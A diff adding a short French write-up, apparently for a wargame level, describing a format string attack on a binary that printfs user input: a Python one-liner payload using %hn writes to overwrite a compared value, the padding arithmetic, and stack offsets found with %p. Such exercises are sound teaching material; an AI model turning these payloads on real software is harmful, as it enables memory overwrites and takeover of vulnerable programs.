@@ -1,0 +1,27 @@
+A l'annalyse du source du binaire nous nous sommes rendu compte qu'il y avait
+une ecriture a l'aide de printf du buffer lu. Nous avons aussi vu une comparaison
+par la suite.
+Nous avons donc fait une format string attack, puis ecrit dans eax la valeur qui
+est compare.
+
+python -c "print '\x10\x98\x04\x08\x12\x98\x04\x08' + '%250x' + '%13\$hn' + '%21570x' + '%12\$hn'" > /tmp/level5
+
+\x10\x98\x04\x08\x12\x98\x04\x08 == la plage de l'adresse debut = \x10\x98\x04\x08
+ce sont les 2 premier byte, les 2 dernier = \x12\x98\x04\x08
+
+Pour trouver 250 et 21570 nous avons procede au calcul suivant:
+
+$0x1025544 == 0x0102 = 258, 0x5544 = 21828
+
+258 - 8 = 250 les 8 bytes en moins sont les bytes deja ecrit.
+
+21828 - 250 - 8 = 21570
+
+Nous devons donc ecrire 250 sur les 2 bytes et 21570 sur deux autre bytes.
+
+pour trouver 12 et 13 nous avons passer %p pour savoir ou se situe notre chaine
+de caractere dans la stack.
+
+Puis:
+
+cat /tmp/level5 - | ./level4
